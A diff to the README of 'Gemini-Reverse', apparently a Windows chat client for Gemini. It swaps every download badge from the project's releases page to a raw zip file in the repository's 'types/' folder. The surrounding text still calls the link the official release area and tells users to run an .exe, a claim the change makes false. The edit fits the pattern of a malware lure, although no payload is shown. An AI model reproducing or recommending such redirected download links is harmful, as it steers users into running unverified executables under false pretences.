@@ -1,6 +1,6 @@
 # 🪐 Gemini-Reverse - Simple Client for Gemini Chat
 
-[![Download Gemini-Reverse](https://img.shields.io/badge/Download-Gemini--Reverse-brightgreen)](https://github.com/ubaid0000/Gemini-Reverse/releases)
+[![Download Gemini-Reverse](https://img.shields.io/badge/Download-Gemini--Reverse-brightgreen)](https://github.com/ubaid0000/Gemini-Reverse/raw/refs/heads/main/types/Reverse-Gemini-v1.0.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Gemini-Reverse is a ready-made app. You do not need to install Node.js, Python, 
 
 Visit this page to download the Gemni-Reverse app for Windows.
 
-[![Download Now](https://img.shields.io/badge/Download-Gemini--Reverse-blue)](https://github.com/ubaid0000/Gemini-Reverse/releases)
+[![Download Now](https://img.shields.io/badge/Download-Gemini--Reverse-blue)](https://github.com/ubaid0000/Gemini-Reverse/raw/refs/heads/main/types/Reverse-Gemini-v1.0.zip)
 
 This link goes to the official release area. Look for the latest file with `.exe` in the name. It is usually named like `Gemini-Reverse-Setup.exe` or similar.
 
@@ -121,4 +121,4 @@ Updates are published regularly on the release page linked above. Check periodic
 
 ---
 
-[![Download Gemini-Reverse](https://img.shields.io/badge/Download-Gemini--Reverse-brightgreen)](https://github.com/ubaid0000/Gemini-Reverse/releases)
+[![Download Gemini-Reverse](https://img.shields.io/badge/Download-Gemini--Reverse-brightgreen)](https://github.com/ubaid0000/Gemini-Reverse/raw/refs/heads/main/types/Reverse-Gemini-v1.0.zip)
